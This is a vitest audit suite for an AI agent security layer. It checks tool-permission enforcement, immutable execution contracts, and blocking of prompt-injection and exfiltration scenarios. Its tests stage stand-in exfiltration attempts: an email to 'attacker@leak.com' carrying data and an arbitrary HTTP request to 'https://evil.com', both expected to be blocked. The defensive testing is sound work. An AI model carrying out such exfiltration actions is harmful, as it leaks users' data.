import { describe, it, expect } from 'vitest'
import { AgentRunner } from '../src/agent/AgentRunner'
import { ProvenanceTracker } from '../src/security/ProvenanceTracker'
import { TaintEngine } from '../src/security/TaintEngine'
import { RuntimeEnforcement } from '../src/security/RuntimeEnforcement'
import { SandboxTools } from '../src/agent/SandboxTools'
import { isFirebaseLive } from '../src/firebase/firestore'
import { validateFirebaseConfig } from '../src/firebase/config'
import { EnforcementDecision, type ProposedToolAction } from '../src/types/security'
import { createContract } from '../src/security/ExecutionContract'
import { v4 as uuidv4 } from 'uuid'

describe('AUDIT VERIFICATION SUITE — TRACEGUARD AI PHASE 2', () => {
  it('AUDIT 1: Firebase Configuration State Check', () => {
    const { valid, missing } = validateFirebaseConfig()
    const live = isFirebaseLive()

    console.log('[AUDIT 1 Result] Firebase Config Valid:', valid)
    console.log('[AUDIT 1 Result] Missing Keys:', missing)
    console.log('[AUDIT 1 Result] isFirebaseLive():', live)

    // Verify system accurately reports that live credentials are missing
    expect(live).toBe(false)
    expect(missing.length).toBeGreaterThan(0)
  })

  it('AUDIT 2: Execution Path Audit & Gateway Bypass Resistance', async () => {
    const provenance = new ProvenanceTracker()
    const taintEngine = new TaintEngine()
    const enforcement = new RuntimeEnforcement(provenance, taintEngine)

    const contract = createContract({
      userId: 'audit_user',
      sessionId: 'sess_audit',
      userGoal: 'Audit sandbox tool boundary',
      allowedTools: ['read_document'],
      allowedRecipients: [],
      restrictedDataCategories: ['credentials', 'financial'],
      externalExportPermitted: false,
    })

    const sandbox = new SandboxTools(enforcement, provenance, contract, 'audit_user', 'sess_audit')

    // Direct invocation of read_document with compliant tool
    const userNode = provenance.createUserInstructionNode('Read safe document', 'audit_user')
    const readRes = await sandbox.read_document('project_alpha_report', userNode.id)
    expect(readRes.success).toBe(true)
    expect(readRes.blocked).toBeUndefined()
    expect(readRes.securityDecision?.decision).toBe(EnforcementDecision.ALLOW)

    // Direct invocation of prohibited tool (send_email_mock is NOT in contract)
    const emailRes = await sandbox.send_email_mock({
      recipient: 'attacker@leak.com',
      subject: 'Bypass test',
      body: 'Data payload',
      initiatedByNodeId: userNode.id,
    })
    expect(emailRes.success).toBe(false)
    expect(emailRes.blocked).toBe(true)
    expect(emailRes.securityDecision?.decision).toBe(EnforcementDecision.BLOCK)
    expect(emailRes.securityDecision?.policyRuleTriggered).toBe('RULE_001')

    // Direct invocation of prohibited export tool
    const unallowedAction: ProposedToolAction = {
      id: uuidv4(),
      toolName: 'http_request_arbitrary',
      parameters: { url: 'https://evil.com' },
      initiatedByNodeId: userNode.id,
      sessionId: 'sess_audit',
      timestamp: Date.now(),
    }
    const directDecision = await enforcement.evaluate(unallowedAction, contract, 'audit_user')
    expect(directDecision.decision).toBe(EnforcementDecision.BLOCK)
  })

  it('AUDIT 3: Immutability Audit on ExecutionContract', () => {
    const contract = createContract({
      userId: 'audit_user',
      sessionId: 'sess_immutability',
      userGoal: 'Immutability test',
      allowedTools: ['read_document'],
      externalExportPermitted: false,
    })

    // Attempting property modification on frozen object must fail
    expect(Object.isFrozen(contract)).toBe(true)

    expect(() => {
      // @ts-expect-error test runtime mutation
      contract.externalExportPermitted = true
    }).toThrow()

    expect(() => {
      ;(contract.allowedTools as unknown as string[]).push('unauthorized_tool')
    }).toThrow()

    expect(contract.externalExportPermitted).toBe(false)
    expect(contract.allowedTools).toEqual(['read_document'])
  })

  it('AUDIT 4: Full Audit of Scenario A, B, and C with Data Captures', async () => {
    const runner = new AgentRunner()

    // ── SCENARIO A ──────────────────────────────────────────
    const resA = await runner.runScenarioA()
    expect(resA.success).toBe(true)
    const stateA = runner.getState()!

    console.log('[SCENARIO A AUDIT]')
    console.log('- Goal:', stateA.contract.userGoal)
    console.log('- Allowed Tools:', stateA.contract.allowedTools)
    console.log('- Allowed Actions Count:', stateA.session.allowedActions)
    console.log('- Blocked Actions Count:', stateA.session.blockedActions)
    console.log('- Final Decision:', stateA.decisions[0].decision)
    console.log('- Rule Triggered:', stateA.decisions[0].policyRuleTriggered)

    expect(stateA.session.allowedActions).toBe(1)
    expect(stateA.session.blockedActions).toBe(0)
    expect(stateA.decisions[0].decision).toBe(EnforcementDecision.ALLOW)
    expect(stateA.decisions[0].policyRuleTriggered).toBe('RULE_008')

    // ── SCENARIO B ──────────────────────────────────────────
    const resB = await runner.runScenarioB()
    expect(resB.blocked).toBe(true)
    const stateB = runner.getState()!

    console.log('[SCENARIO B AUDIT]')
    console.log('- Tainted Node Count:', stateB.taintEngine.taintedCount)
    console.log('- Block Reason:', resB.violationReason)
    console.log('- Events Logged:', stateB.events.map((e) => e.type))

    expect(stateB.session.blockedActions).toBe(1)
    expect(stateB.taintEngine.taintedCount).toBeGreaterThan(0)
    expect(stateB.events.some((e) => e.type === 'PROMPT_INJECTION_DETECTED')).toBe(true)
    const blockDecB = stateB.decisions.find((d) => d.decision === EnforcementDecision.BLOCK)
    expect(blockDecB).toBeDefined()

    // ── SCENARIO C ──────────────────────────────────────────
    const resC = await runner.runScenarioC()
    expect(resC.blocked).toBe(true)
    const stateC = runner.getState()!

    console.log('[SCENARIO C AUDIT]')
    console.log('- Allowed Recipient:', stateC.contract.allowedRecipients)
    console.log('- Attempted Action Parameters:', stateC.steps[1].actionProposed?.parameters)
    console.log('- Block Rule Triggered:', stateC.steps[1].securityDecision?.policyRuleTriggered)

    expect(stateC.session.allowedActions).toBe(1) // reading milestones was allowed
    expect(stateC.session.blockedActions).toBe(1) // send_email_mock was blocked
    const blockDecC = stateC.steps[1].securityDecision
    expect(blockDecC?.decision).toBe(EnforcementDecision.BLOCK)
    expect(blockDecC?.policyRuleTriggered).toMatch(/RULE_002|RULE_005/)
  })
})
